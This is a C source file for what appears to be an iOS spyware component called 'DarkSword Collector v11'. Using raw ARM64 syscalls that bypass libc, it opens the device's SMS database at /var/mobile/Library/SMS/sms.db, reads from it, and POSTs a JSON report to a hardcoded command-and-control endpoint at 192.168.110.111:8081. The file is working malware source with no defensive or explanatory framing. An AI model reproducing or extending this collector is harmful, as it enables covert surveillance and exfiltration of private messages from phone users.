/**
 * DarkSword Collector v11 - Raw syscall HTTP POST (port 8081 fixed)
 * Stack-only buffers, no globals, sendto with 6 args
 */

static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
static int _itoa(int val, char *buf) {
    int i=0; char tmp[16]; int t=0;
    if(val==0){buf[0]='0';buf[1]=0;return 1;}
    while(val>0){tmp[t++]='0'+(val%10);val/=10;}
    for(int j=t-1;j>=0;j--) buf[i++]=tmp[j];
    buf[i]=0; return i;
}

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long _svc6(long n, long a, long b, long c, long d, long e, long f) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    register long x4 __asm__("x4") = e;
    register long x5 __asm__("x5") = f;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5) : "memory");
    return x0;
}

#define SYS_open    5
#define SYS_read    3
#define SYS_close   6
#define SYS_write   4
#define SYS_socket  97
#define SYS_connect 98
#define SYS_sendto  133

static void _stderr(const char *msg) {
    _svc3(SYS_write, 2, (long)msg, _strlen(msg));
}

static int _http_post(const char *body, int blen) {
    char http[1024];
    int h = 0;
    const char *hdr = "POST /api/v1/c2/report HTTP/1.1\r\nHost: 192.168.110.111:8081\r\nContent-Type: application/json\r\nContent-Length: ";
    _memcpy(http+h, hdr, _strlen(hdr)); h += _strlen(hdr);
    char nb[8]; _itoa(blen, nb); _memcpy(http+h, nb, _strlen(nb)); h += _strlen(nb);
    const char *tail = "\r\nConnection: close\r\n\r\n";
    _memcpy(http+h, tail, _strlen(tail)); h += _strlen(tail);
    if (h+blen < 1024) { _memcpy(http+h, body, blen); h += blen; }

    int sock = (int)_svc3(SYS_socket, 2, 1, 0);
    if (sock < 0) { _stderr("[v11] sock fail\n"); return -1; }

    unsigned char addr[16];
    for (int i=0;i<16;i++) addr[i]=0;
    addr[0]=2; addr[1]=0;
    addr[2]=0x1f; addr[3]=0x91; /* port 8081 */
    addr[4]=192; addr[5]=168; addr[6]=110; addr[7]=111;

    long cr = _svc3(SYS_connect, sock, (long)addr, 16);
    if (cr < 0) { _stderr("[v11] conn fail\n"); _svc1(SYS_close, sock); return -2; }

    long sr = _svc6(SYS_sendto, sock, (long)http, h, 0, 0, 0);
    _svc1(SYS_close, sock);
    return (int)sr;
}

void ds_start(void) {
    _stderr("[v11] start\n");

    char body[512];
    int bl = 0;
    const char *p1 = "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"SMS\",\"username\":\"";
    _memcpy(body+bl, p1, _strlen(p1)); bl += _strlen(p1);

    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);

    if (fd >= 0) {
        char data[256];
        int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data)-1);
        _svc1(SYS_close, fd);
        if (n < 0) n = 0;

        const char *p2 = "read_ok\",\"token\":\"size=";
        _memcpy(body+bl, p2, _strlen(p2)); bl += _strlen(p2);
        char nbuf[8]; _itoa(n, nbuf); _memcpy(body+bl, nbuf, _strlen(nbuf)); bl += _strlen(nbuf);
        const char *p3 = "\"}}";
        _memcpy(body+bl, p3, _strlen(p3)); bl += _strlen(p3);
    } else {
        const char *p2 = "access_denied\",\"token\":\"fd=";
        _memcpy(body+bl, p2, _strlen(p2)); bl += _strlen(p2);
        char fbuf[8]; _itoa(fd, fbuf); _memcpy(body+bl, fbuf, _strlen(fbuf)); bl += _strlen(fbuf);
        const char *p3 = "\"}}";
        _memcpy(body+bl, p3, _strlen(p3)); bl += _strlen(p3);
    }
    body[bl] = 0;

    int r = _http_post(body, bl);
    _stderr("[v11] post=");
    char rb[8]; _itoa(r, rb); _stderr(rb); _stderr("\n[v11] done\n");
}
